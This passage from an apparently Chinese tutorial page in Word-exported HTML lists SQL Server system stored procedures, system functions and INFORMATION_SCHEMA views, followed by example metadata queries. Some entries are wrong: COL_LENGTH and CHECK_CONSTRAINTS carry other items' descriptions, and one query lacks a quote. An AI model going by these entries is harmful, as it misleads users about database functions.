Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前服务器上的所有数据库的基本信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:3;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_fkeys</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">若参数为带有主键的表，则返回包含指向该表的外键的所有表；若参数为带有外键的表名，则返回所有同过主键</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">/</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">外键关系与该外键相关联的所有表。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:4;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_pkeys</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定表的主键信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:5;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_server_info</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前服务器的各种特性及其对应取值。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:6;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_sproc_columns</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定存储过程的的输入、输出参数的信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:7;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_statistics</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定的表或索引视图上的所有索引以及统计的信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:8;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_stored_procedures</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前数据库的存储过程列表，包含系统存储过程。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:9;mso-yfti-lastrow:yes;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">sp_tables</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前数据库的所有表和视图，包含系统表。</span></span><br><br></td><br></tr><br></tbody><br></table><br><br><span lang="EN-US">&lt;o:p&gt;<span style="font-family:’Times New Roman’;font-size:small;">&nbsp;</span>&lt;/o:p&gt;</span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">—-</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">系统函数</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">—————————————————————————————————-</span></span></span><br><br><table style="width:375pt;background:#cccccc;mso-cellspacing:.7pt;mso-padding-alt:3.75pt 3.75pt 3.75pt 3.75pt;" class="MsoNormalTable ke-zeroborder" border="0" cellspacing="1" cellpadding="0" width="500"><br><tbody><br><tr style="mso-yfti-irow:0;mso-yfti-firstrow:yes;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">COLUMNPROPERTY</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回有关列或过程参数的信息，如是否允许空值，是否为计算列等。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:1;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">COL_LENGTH</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定数据库的指定属性值，如是否处于只读模式等。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:2;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">DATABASEPROPERTYEX</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定数据库的指定选项或属性的当前设置，如数据库的状态、恢复模型等。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:3;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">OBJECT_ID</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定数据库对象名的标识号</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:4;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">OBJECT_NAME</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定数据库对象标识号的对象名。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:5;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">OBJECTPROPERTY</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回指定数据库对象标识号的有关信息，如是否为表，是否为约束等。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:6;mso-yfti-lastrow:yes;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">fn_listextendedproperty</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回数据库对象的扩展属性值，如对象描述、格式规则、输入掩码等。</span></span><br><br></td><br></tr><br></tbody><br></table><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">—-</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">使用信息架构视图访问元数据</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">—————————————————————————————————</span></span></span><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">信息架构视图基于</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL-92 </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">标准中针对架构视图的定义，这些视图独立于系统表，提供了关于</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL Server </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">元数据的内部视图。信息架构视图的最大优点是，即使我们对系统表进行了重要的修改，应用程序也可以正常地使用这些视图进行访问。因此对于应用程序来说，只要是符合</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL-92 </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">标准的数据库系统，使用信息架构视图总是可以正常工作的。</span></span><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">常用的信息架构视图有以下一些：</span></span><br><br><table style="width:472.45pt;background:#cccccc;mso-cellspacing:.7pt;mso-padding-alt:3.75pt 3.75pt 3.75pt 3.75pt;" class="MsoNormalTable ke-zeroborder" border="0" cellspacing="1" cellpadding="0" width="630"><br><tbody><br><tr style="mso-yfti-irow:0;mso-yfti-firstrow:yes;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">信息架构视图</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">描述</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:1;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .CHECK_CONSTRAINTS</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回有关列或过程参数的信息，如是否允许空值，是否为计算列等。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:2;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .COLUMNS</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前数据库中当前用户可以访问的所有列及其基本信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:3;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .CONSTRAINT_COLUMN_USAGE</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前数据库中定义了约束的所有列及其约束名。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:4;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .CONSTRAINT_TABLE_USAGE</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前数据库中定义了约束的所有表及其约束名。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:5;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .KEY_COLUMN_USAGE</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">返回当前数据库中作为主键</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">/</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">外键约束的所有列。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:6;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .SCHEMATA</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前用户具有权限的所有数据库及其基本信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:7;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .TABLES</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前用户具有权限的当前数据库中的所有表或者视图及其基本信息。</span></span><br><br></td><br></tr><br><tr style="mso-yfti-irow:8;mso-yfti-lastrow:yes;"><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;"><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INFORMATION_SCHEMA .VIEWS</span></span><br><br></td><br><td style="border-bottom-color:#ffffff;padding-bottom:3.75pt;border-top-color:#ffffff;padding-left:3.75pt;width:179.3pt;padding-right:3.75pt;background:white;border-right-color:#ffffff;border-left-color:#ffffff;padding-top:3.75pt;" width="239"><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">返回当前数据库中的当前用户可以访问的视图及其所有者、定义等信息。</span></span><br><br></td><br></tr><br></tbody><br></table><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">由于这些信息架构都是以视图的方式存在的，因此我们可以很方便地获得并利用需要的信息。</span></span><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">例如，我们要得到某个表有多少列，可以使用以下语句：</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT COUNT(&amp;#42) FROM INFORMATION_SCHEMA.COLUMNS </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">WHERE TABLE_NAME=’mytable’</span></span><br><br>&nbsp;<br><br>&nbsp;<br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">—-</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">应用</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">———————————————————————-</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–1</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">：获取当前数据库中的所有用户表</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">select Name from sysobjects where xtype=’u’ and status&gt;=0</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–2</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">：获取某一个表的所有字段</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">select name from syscolumns where id=object_id(N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’)</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–3</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">：查看与某一个表相关的视图、存储过程、函数</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">select a.&amp;#42 from sysobjects a, syscomments b where a.id = b.id and b.text like N’%</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">%’</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–4</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">：查看当前数据库中所有存储过程</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">select name as </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">存储过程名称</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> from sysobjects where xtype=’P’</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–5</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">：查询用户创建的所有数据库</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">select &amp;#42 from master..sysdatabases D where sid not in(select sid from master..syslogins where name=’sa’)</span></span><br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">或者</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">select dbid, name AS DB_NAME from master..sysdatabases where sid &lt;&gt; 0x01</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–6</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">：查询某一个表的字段和数据类型</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">select column_name,data_type from information_schema.columns</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">where table_name = N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’ </span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–7:</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">获取数据库文件路径</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">select ltrim(rtrim(filename)) from </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">数据库名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">..sysfiles where charindex(’MDF’,filename)&gt;0</span></span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">or</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">select ltrim(rtrim(filename)) from </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">数据库名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">..sysfiles where charindex(’LDF’,filename)&gt;0</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–8:</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">获取某一个表的基本信息</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">sp_MShelpcolumns N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–9:</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">获取某一个表的主键、外键信息</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">exec sp_pkeys N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">exec sp_fkeys&nbsp; N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">–10:</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">判断某一个表是否存在某一列</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">(</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">字段</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">)</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">if exists(select 1 from syscolumns where id=object_id(N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表名</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">) and name=N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">字段</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’)</span></span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span 